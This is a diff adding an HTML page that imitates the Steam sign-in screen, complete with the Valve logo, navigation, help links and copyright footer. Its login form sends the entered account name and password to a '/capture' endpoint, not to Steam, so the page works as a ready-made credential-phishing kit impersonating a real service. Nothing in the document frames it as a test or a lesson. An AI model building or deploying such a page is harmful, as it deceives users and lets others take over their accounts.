@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Steam</title>
+<link href="https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#1b2838;
+    font-family:Arial,'Arial Unicode MS',Helvetica,sans-serif;
+    min-height:100vh;display:flex;flex-direction:column
+  }
+  /* ── Top nav ── */
+  .topbar{
+    height:60px;background:linear-gradient(to bottom,#1b2838,#162430);
+    border-bottom:1px solid #000;
+    display:flex;align-items:center;padding:0 16px;gap:16px
+  }
+  .steam-wordmark{display:flex;align-items:center;gap:8px}
+  .steam-wordmark svg{height:28px}
+  .steam-wordmark span{
+    color:#c6d4df;font-size:.9375rem;font-weight:700;
+    letter-spacing:.5px;text-transform:uppercase
+  }
+  .topnav{display:flex;gap:0;margin-left:12px}
+  .topnav a{
+    color:#c6d4df;font-size:.8125rem;text-decoration:none;
+    padding:0 12px;height:60px;display:flex;align-items:center;
+    border-bottom:2px solid transparent
+  }
+  .topnav a:hover{color:#fff;border-bottom-color:#c6d4df}
+  .topnav a.active{border-bottom-color:#c94f20}
+  /* ── Page layout ── */
+  .page{
+    flex:1;display:flex;justify-content:center;align-items:flex-start;
+    padding:56px 16px 40px
+  }
+  .login-wrap{width:380px}
+  .login-header{
+    text-align:center;margin-bottom:20px;
+    font-size:1.2rem;color:#c6d4df;font-weight:700;
+    text-transform:uppercase;letter-spacing:.05em
+  }
+  /* ── Form panel ── */
+  .panel{
+    background:linear-gradient(to bottom,#3d3d3f,#2a475e);
+    border-radius:4px;overflow:hidden;
+    box-shadow:0 0 20px rgba(0,0,0,.6)
+  }
+  .panel-head{
+    background:linear-gradient(to right,#4c6b22 0%,#3b5715 100%);
+    padding:10px 16px;font-size:.75rem;font-weight:700;
+    color:#d2e885;text-transform:uppercase;letter-spacing:.08em;
+    border-bottom:1px solid #2a3d14
+  }
+  .panel-body{padding:20px 20px 16px;background:rgba(0,0,0,.2)}
+  .field{margin-bottom:14px}
+  .field label{
+    display:block;font-size:.6875rem;font-weight:700;
+    color:#c6d4df;text-transform:uppercase;letter-spacing:.05em;margin-bottom:5px
+  }
+  .field input{
+    width:100%;
+    background:#32343a;
+    border:1px solid #000;
+    border-radius:3px;padding:8px 10px;
+    font-size:.9rem;color:#c6d4df;
+    font-family:inherit;outline:none;
+    box-shadow:inset 0 1px 3px rgba(0,0,0,.5)
+  }
+  .field input:focus{border-color:#67c1f5;background:#2a2c33}
+  .field input::placeholder{color:#666}
+  .remember-row{
+    display:flex;align-items:center;gap:8px;
+    margin-bottom:16px;font-size:.75rem;color:#c6d4df
+  }
+  .remember-row input[type=checkbox]{
+    width:14px;height:14px;accent-color:#67c1f5;cursor:pointer
+  }
+  .btn-row{display:flex;justify-content:flex-end;align-items:center;gap:12px}
+  .btn{
+    background:linear-gradient(to bottom,#75b022,#588a1b);
+    color:#d2e885;border:none;border-radius:3px;
+    padding:7px 20px;font-size:.8125rem;font-weight:700;
+    cursor:pointer;font-family:inherit;
+    text-shadow:1px 1px 0 rgba(0,0,0,.3);
+    box-shadow:1px 1px 0 rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.15);
+    letter-spacing:.03em
+  }
+  .btn:hover{background:linear-gradient(to bottom,#8ecf2a,#6aa320)}
+  .btn:active{background:linear-gradient(to top,#75b022,#588a1b);box-shadow:inset 0 2px 3px rgba(0,0,0,.4)}
+  .help-section{
+    background:rgba(0,0,0,.15);
+    border-top:1px solid rgba(0,0,0,.3);
+    padding:12px 20px;text-align:center
+  }
+  .help-section a{
+    font-size:.75rem;color:#67c1f5;text-decoration:none;
+    display:block;margin-bottom:4px
+  }
+  .help-section a:hover{color:#fff;text-decoration:underline}
+  .help-row{
+    display:flex;justify-content:center;gap:8px;margin-top:6px;flex-wrap:wrap
+  }
+  .help-row a{margin-bottom:0}
+  .sep{color:#4b4f56;font-size:.75rem;align-self:center}
+  /* ── QR section ── */
+  .alt-login{
+    margin-top:16px;padding:14px;
+    background:rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.08);
+    border-radius:4px;text-align:center
+  }
+  .alt-login p{font-size:.75rem;color:#c6d4df;margin-bottom:10px}
+  .alt-btn{
+    display:inline-flex;align-items:center;gap:6px;
+    background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.15);
+    border-radius:3px;padding:6px 14px;font-size:.8125rem;color:#c6d4df;
+    text-decoration:none;cursor:pointer;font-family:inherit;
+    transition:background .15s
+  }
+  .alt-btn:hover{background:rgba(255,255,255,.12)}
+  footer{
+    background:#171a21;border-top:1px solid #000;
+    padding:20px;text-align:center;font-size:.6875rem;color:#556772
+  }
+  footer a{color:#556772;text-decoration:none;margin:0 6px}
+  footer a:hover{color:#c6d4df}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="steam-wordmark">
+    <svg viewBox="0 0 65 65" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#c6d4df" d="M32.5 0C14.56 0 0 14.56 0 32.5c0 15.14 10.35 27.87 24.35 31.52l8.78-20.3a9.32 9.32 0 01-1.88-18.42l-12.4-5.22a23.48 23.48 0 0113.65-4.36c12.97 0 23.48 10.51 23.48 23.48 0 7.04-3.1 13.37-8.02 17.69L54.4 9.28A32.3 32.3 0 0032.5 0z"/>
+      <path fill="#c6d4df" d="M24.5 47.5l-3.56 8.24A32.52 32.52 0 0032.5 65c17.94 0 32.5-14.56 32.5-32.5 0-.55-.02-1.09-.04-1.63L50 38.06a9.31 9.31 0 01-9.29 8.47 9.35 9.35 0 01-3.63-.73L24.5 47.5z"/>
+      <circle fill="#1b2838" cx="40.71" cy="29.69" r="6.22"/>
+    </svg>
+    <span>Steam</span>
+  </div>
+  <nav class="topnav">
+    <a href="#">STORE</a>
+    <a href="#">COMMUNITY</a>
+    <a href="#">ABOUT</a>
+    <a href="#">SUPPORT</a>
+  </nav>
+</div>
+
+<div class="page">
+  <div class="login-wrap">
+    <p class="login-header">Sign In</p>
+    <div class="panel">
+      <div class="panel-head">Sign In</div>
+      <div class="panel-body">
+        <form method="POST" action="/capture" autocomplete="on">
+          <div class="field">
+            <label>Steam Account Name</label>
+            <input name="email" type="text" required autocomplete="username" autofocus>
+          </div>
+          <div class="field">
+            <label>Password</label>
+            <input name="password" type="password" id="pw" required autocomplete="current-password">
+          </div>
+          <div class="remember-row">
+            <input type="checkbox" id="rem">
+            <label for="rem">Remember me on this computer</label>
+          </div>
+          <div class="btn-row">
+            <button type="submit" class="btn">SIGN IN</button>
+          </div>
+        </form>
+      </div>
+      <div class="help-section">
+        <a href="#">Forgot your Steam Account name or password?</a>
+        <div class="help-row">
+          <a href="#">I can't sign in to my Steam Account</a>
+          <span class="sep">|</span>
+          <a href="#">Create a free account</a>
+        </div>
+      </div>
+    </div>
+    <div class="alt-login">
+      <p>Sign in with QR code</p>
+      <button class="alt-btn" tabindex="-1">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#c6d4df"><path d="M3 11h8V3H3v8zm2-6h4v4H5V5zm8-2v8h8V3h-8zm6 6h-4V5h4v4zM3 21h8v-8H3v8zm2-6h4v4H5v-4zm13 0h-3v2h2v2h-2v2h4v-4h-1v-2zm-4-2h2v2h-2v-2zm2 4h2v2h-2v-2zm-4 4v-2h2v2h-2z"/></svg>
+        Use the Steam Mobile App
+      </button>
+    </div>
+  </div>
+</div>
+<footer>
+  <p>© Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
+  <p style="margin-top:6px">
+    <a href="#">Privacy Policy</a>
+    <a href="#">Legal</a>
+    <a href="#">Steam Subscriber Agreement</a>
+    <a href="#">Refunds</a>
+  </p>
+</footer>
+</body>
+</html>
